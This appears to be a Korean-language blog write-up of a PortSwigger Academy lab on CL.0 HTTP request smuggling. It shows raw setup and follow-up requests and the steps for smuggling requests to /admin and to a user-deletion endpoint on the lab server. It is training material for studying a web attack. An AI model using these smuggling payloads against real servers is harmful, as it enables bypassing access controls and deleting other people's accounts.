---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: CL.0 request smuggling"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2024-03-11 21:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 여기서부터는 웹 브라우저로 공격가능한 요청 스머글링 패턴을 다룬다.
- 이는 2022년 8월에 발표된 James Kettle의 [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks)에 기초한 내용이다. 
- HTTP Request Smuggling 취약점 문제 19번부터 22번까지 네 개 문제는 이와 관련된 내용이다.
- 문제 주소: https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling
- 취약점 설명페이지(개요): https://portswigger.net/web-security/request-smuggling/browser
- 취약점 설명페이지(CL.0 상세): https://portswigger.net/web-security/request-smuggling/browser/cl-0
- 난이도: PRACTITIONER (보통)


# CL.0 request smuggling 개요 
- 브라우저로 실행가능한 요청 스머글링과 기존의 스머글링이 다른 점은 victim에게 수행시킴으로서 스스로의 커넥션을 오염시키는 수단으로 사용할 수 있다는 것이다. 
- 프론트엔드 서버는 CL헤더를 보지만, 백엔드 서버가 CL헤더를 무시하는 경우는 `CL.0`라고 하는 패턴으로 부른다. 

## Repeater에서 CL.0 테스트하는 법
CL.0를 테스트하려면 셋업 요청의 바디에 스머글 요청을 포함시킨다. 그리고 뒤따르는 일반적인 요청을 준비한다. 그리고 뒤따르는 요청이 직전에 스머글링한 요청에 의해서 영향받는지를 확인하면 된다. 

다음 예에서 뒤따르는 일반적인 요청의 응답이 404가 된다면 스머글링한 요청이 서버에서 처리되었을 가능성이 아주 높다는 것을 알 수 있따. 

![CL.0 취약한 예](/images/burp-academy-hrs-19-1.png)

1. (스머글링 요청을 바디에 포함하는) 셋업 요청과 일반적인 뒤따르는 요청을 각각 별도의 탭으로 준비한다. ※ 스머글링 요청과 뒤따르는 요청는 각각 다른 응답이 돌아와야 한다. 그래야 구분이 가능하다. 
2. 두 탭을 올바른 순서 (셋업먼저, 뒤따르는 요청뒤에)로 해서 하나의 그룹으로 묶는다. 
3. Menu에서 Send Mode를 Send group in sequence (single connection)로 선택한다.
4. `Connection` 헤더 값을 `keep-alive`로 변경한다. 
5. 요청을 보내서 응답을 확인한다. 뒤따르는 요청의 응답이 

## CL.0 거동을 끌어내기(Eliciting CL.0 behavior)
- 서버가 CL.0 취약점이 없는 것처럼 동작할 때가 있다. 
- 이럴 때 [헤더 헷갈리게 만들기 테크닉](https://portswigger.net/web-security/request-smuggling#te-te-behavior-obfuscating-the-te-header)을 사용하면 CL.0 거동을 끌어낼 수 있을 때가 있다. 


# 랩 개요
- 이 랩은 CL.0 요청 스머글링에 취약하다. 백엔드 서버는 CL헤더를 무시한다. 
- 랩을 풀려면 취약한 엔드포인트를 찾아서 백엔드 서버에게 admin패널에 접근하는 요청을 스머글링하여 carlos유저를 삭제하면 된다. 

```
This lab is vulnerable to CL.0 request smuggling attacks. The back-end server ignores the Content-Length header on requests to some endpoints.

To solve the lab, identify a vulnerable endpoint, smuggle a request to the back-end to access to the admin panel at /admin, then delete the user carlos.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling.
```

# 풀이 
0. 유저를 삭제할 수 있는 admin 기능은 접근제어가 되어 있다. 

![admin 접근 결과](/images/burp-academy-hrs-19-0.png)

1. CL.0 타입의 스머글링이 가능한지 체크하기 위해 다음과 같은 페이로드를 준비한다. 

셋업요청 

```http
POST / HTTP/1.1
Host: 0a8a005d04457df68372230a000200ce.web-security-academy.net
Cookie: session=IamwLprknVmn3aaKFARAieb4tPBP7xSG
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Connection: keep-alive
Content-Length: 25

GET /404 HTTP/1.1
Foo: x
```

뒤따르는 요청

```http
GET / HTTP/1.1
Host: 0a8a005d04457df68372230a000200ce.web-security-academy.net
Cookie: session=IamwLprknVmn3aaKFARAieb4tPBP7xSG
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36


```

2. 두 요청을 그룹으로 묶은 후 싱글 커넥션으로 요청을 보내본다. 두번째 탭에서 200응답이 돌아왔다. 스머글링이 안되는 것 처럼 보인다. 

![스머글링 시도 결과1-1](/images/burp-academy-hrs-19-2.png)

![스머글링 시도 결과1-2](/images/burp-academy-hrs-19-3.png)

3. 확장 프로그램 Http Request Smuggler 도 돌려본다. 못 찾는다. 


4. 별 수 없다. 해답을 본다. 스머글링이 가능한 엔드포인트는 `/resources/` 하위에 있는 엔드포인트였다. 이 것을 찾는게 어려웠다. 

![](/images/burp-academy-hrs-19-5.png)

5. 두번째 탭 요청결과다. 404응답이 돌아온 것으로 보아 셋업 요청에 포함된 스머글링 요청이 결과에 영향을 준 것을 알 수 있다. 스머글링에 성공했다. 

![](/images/burp-academy-hrs-19-4.png)

6. 스머글링 요청의 엔드포인트를 `/admin`으로 바꾼다. 

![](/images/burp-academy-hrs-19-6.png)

7. 요청결과다. admin패널의 내용을 확인할 수 있다. carlos유저를 삭제하는 엔드포인트도 보인다. 

![](/images/burp-academy-hrs-19-7.png)

8. 스머글링 요청의 엔드포인트를 7번에서 확인한 엔드포인트 `/admin/delete?username=carlos`로 변경한다. 요청을 보내면 유저삭제가 처리되어 302응답이 반환된다. 

![](/images/burp-academy-hrs-19-8.png)

9. 문제 풀이에 성공했다. 

![](/images/burp-academy-hrs-19-9.png)



